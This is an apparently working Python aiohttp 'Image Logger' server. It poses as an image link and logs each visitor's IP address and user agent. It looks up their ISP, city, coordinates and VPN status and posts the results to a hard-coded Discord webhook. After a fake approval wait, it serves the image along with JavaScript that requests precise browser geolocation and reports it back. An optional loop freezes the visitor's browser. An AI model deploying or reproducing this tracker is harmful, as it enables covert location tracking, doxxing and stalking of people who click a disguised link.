import aiohttp
from aiohttp import web
import json
import httpagentparser
import asyncio

# ==== OPTIONS ====
options = {
    "accurate_location": True,   # Request geolocation after approval
    "browser_stress": False       # Enable heavy JS after approval
}

# ==== CONFIG ====
config = {
    "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
    "image": "https://digitalcommunications.wp.st-andrews.ac.uk/files/2019/04/JPEG_compression_Example.jpg",
    "loading_image": "https://via.placeholder.com/600x400?text=Loading...",
    "username": "Image Logger",
    "color": 0x00FFFF
}

# ==== PENDING APPROVAL STORAGE ====
pending = {}  # {session_id: {"ip":..., "useragent":..., "approved": bool, "lat": None, "lon": None}}

# ==== REPORT FUNCTION WITH GUI STYLE ====
async def make_report(ip, useragent=None, lat=None, lon=None):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"http://ip-api.com/json/{ip}?fields=status,query,isp,as,country,regionName,city,lat,lon,timezone,mobile,proxy,hosting") as resp:
                info = await resp.json()
        except:
            info = {}

        os, browser = httpagentparser.simple_detect(useragent or "")

        payload = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""
**IP Info**
> IP: {info.get('query','Unknown')}
> ISP: {info.get('isp','Unknown')}
> ASN: {info.get('as','Unknown')}
> Country: {info.get('country','Unknown')}
> Region: {info.get('regionName','Unknown')}
> City: {info.get('city','Unknown')}
> Coords: {lat or info.get('lat','Unknown')}, {lon or info.get('lon','Unknown')}
> Timezone: {info.get('timezone','Unknown')}
> Mobile: {info.get('mobile','Unknown')}
> VPN/Proxy: {info.get('proxy','Unknown')}
> Hosting: {info.get('hosting','Unknown')}

**PC Info**
> OS: {os}
> Browser: {browser}

**User Agent**
{useragent or 'Unknown'}
"""
            }]
        }

        try:
            await session.post(config["webhook"], json=payload, timeout=5)
        except:
            pass

# ==== LANDING PAGE ====
async def handle_landing(request):
    session_id = str(id(request))
    client_ip = request.remote
    useragent = request.headers.get('User-Agent', '')

    pending[session_id] = {"ip": client_ip, "useragent": useragent, "approved": False, "lat": None, "lon": None}
    await make_report(client_ip, useragent)

    html_content = f"""
<html>
<head>
<title>Waiting for Approval</title>
<meta property="og:image" content="{config['loading_image']}">
</head>
<body style="text-align:center;">
<h2>Loading Image...</h2>
<p>Please wait for approval to view the image.</p>
<img src="{config['loading_image']}" style="width:50%;height:auto;">

<script>
async function pollApproval() {{
    const response = await fetch('/check_approval/{session_id}');
    const data = await response.json();
    if (data.approved) {{
        window.location.href = '/view_image/{session_id}';
    }} else {{
        setTimeout(pollApproval, 2000);
    }}
}}
pollApproval();
</script>
</body>
</html>
"""
    return web.Response(text=html_content, content_type='text/html')

# ==== CHECK APPROVAL ====
async def check_approval(request):
    session_id = request.match_info.get('session_id')
    approved = pending.get(session_id, {}).get("approved", False)
    return web.json_response({"approved": approved})

# ==== VIEW IMAGE WITH GEO & BROWSER STRESS ====
async def view_image(request):
    session_id = request.match_info.get('session_id')
    user_data = pending.get(session_id)
    if not user_data or not user_data.get("approved"):
        return web.Response(text="Not approved yet.", content_type='text/plain')

    geo_js = ""
    if options["accurate_location"]:
        geo_js = f"""
if (navigator.geolocation) {{
    navigator.geolocation.getCurrentPosition(
        function(position) {{
            fetch('/log_location/{session_id}', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    lat: position.coords.latitude,
                    lon: position.coords.longitude
                }})
            }});
        }}
    );
}}
"""

    stress_js = ""
    if options["browser_stress"]:
        stress_js = """
for (let i=0;i<1e9;i++){Math.sqrt(i);}
"""

    html_content = f"""
<html>
<head><title>Image</title></head>
<body style="text-align:center;">
<img src="{config['image']}" style="width:100%;height:auto;">
<script>
{geo_js}
{stress_js}
</script>
</body>
</html>
"""
    return web.Response(text=html_content, content_type='text/html')

# ==== LOG GEOLOCATION ====
async def log_location(request):
    session_id = request.match_info.get('session_id')
    try:
        data = await request.json()
        if session_id in pending:
            pending[session_id]['lat'] = data.get('lat')
            pending[session_id]['lon'] = data.get('lon')
            await make_report(pending[session_id]['ip'], pending[session_id]['useragent'], data.get('lat'), data.get('lon'))
    except:
        pass
    return web.Response(text="OK")

# ==== SIMULATED BOT APPROVAL ====
async def approve_demo():
    while True:
        await asyncio.sleep(10)  # demo auto-approve every 10 seconds
        for session_id in pending:
            pending[session_id]["approved"] = True

# ==== APP SETUP ====
app = web.Application()
app.router.add_get('/', handle_landing)
app.router.add_get('/check_approval/{session_id}', check_approval)
app.router.add_get('/view_image/{session_id}', view_image)
app.router.add_post('/log_location/{session_id}', log_location)

loop = asyncio.get_event_loop()
loop.create_task(approve_demo())  # replace with real Discord bot approval
web.run_app(app, port=8080)
